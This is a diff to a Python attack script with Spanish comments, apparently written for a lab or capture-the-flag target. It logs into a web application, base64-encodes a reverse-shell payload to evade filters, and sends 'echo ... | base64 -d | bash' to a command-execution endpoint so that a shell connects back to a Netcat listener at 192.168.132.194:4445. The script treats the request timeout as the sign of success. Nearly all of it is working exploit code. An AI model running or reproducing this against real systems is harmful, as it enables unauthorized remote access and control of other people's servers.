@@ -1,6 +1,6 @@
 import requests as re
 import payload as pa # Esto permite usar la funcion que contiene la carga maliciosa
-import base64 # Imporamos esta libreria para realizar el encoding y pasar los filtros
+import base64 as ba # Imporamos esta libreria para realizar el encoding y pasar los filtros
 
 # Se inicia la variable sesion para guardar las cookies
 sesion = re.Session()
@@ -21,23 +21,19 @@ IP_HOST = '192.168.132.194'
 PORT_LISTENER = 4445
 
 # En esta funcion se define la ejecucion remota del payload para recibir la llamada desde el server
-def ejecutar_comandos(payload):
+def ejecutar_comando(payload):
     PAYLOAD_RSHELL = {
         'command' : payload,
         'sub': 'Execute'
     }
 
-    # Mandamos el payload al servidor
-    rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL)
-    
-    if rce_respuesta.status_code == 200:
-        # Se intenta limpiar la salida y asi comprobar si hubo o no respuesta
-        try:
-            return rce_respuesta.text.split('<pre>')[1].split('</pre>')[0].strip()
-        except IndexError:
-            return "[!] Comando sin salida o bloqueado."
-    else:
-        return f"[!] Error HTTP: {rce_respuesta.status_code}"
+    # Mandamos el payload al servidor y anadimos timeout (la ejecucion se quedara congelada ya que es una rshell)
+    try:
+        rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL, timeout=3)
+    # Capturamos el timeout, que en este caso ¡significa EXITO!
+    except re.exceptions.ReadTimeout:
+        print("Timeout detectado! Revisa tu ventana de Netcat (P4445)")
+        return "Reverse Shell lanzada."
 
 # Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
 estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)
@@ -53,7 +49,13 @@ if estado_login.status_code == 200:
         print('-' * 50)
         # Realizo una llamada a la funcion importada de payload as pa (reverse_shell(ip, puerto))
         payload_raw = pa.reverse_shell(IP_HOST, PORT_LISTENER)
-        print(payload_raw)
+        # print(payload_raw) # Prueba del contenido en crudo del payload
+        payload_base64 = ba.b64encode(payload_raw.encode()).decode() # Realizamos la conversion necesaria b64
+        # Elaboramos el comando que va a ejecutar
+        payload_cmd = f"echo '{payload_base64}' | base64 -d | bash"
+        print(f"Payload ofuscado listo para enviar...")
+        respuesta_payload = ejecutar_comando(payload_cmd)
+        print(respuesta_payload)
     else:
         print('Login fallido!')
 else:
